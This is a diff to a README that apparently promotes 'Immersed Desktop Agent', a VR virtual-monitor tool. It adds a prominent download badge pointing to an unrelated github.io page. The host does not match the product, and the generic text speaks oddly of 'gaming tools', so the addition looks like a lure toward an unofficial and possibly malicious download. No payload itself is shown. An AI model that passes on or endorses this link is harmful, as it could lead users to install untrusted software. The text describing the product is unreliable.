@@ -30,6 +30,12 @@ Immersed Desktop Agent streams up to five virtual monitors into VR, enabling foc
 
 Whether you're a newcomer or a veteran, Immersed Desktop Agent provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Immersed Desktop Agent](https://img.shields.io/badge/⬇_DOWNLOAD_Immersed+Desktop+Agent-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
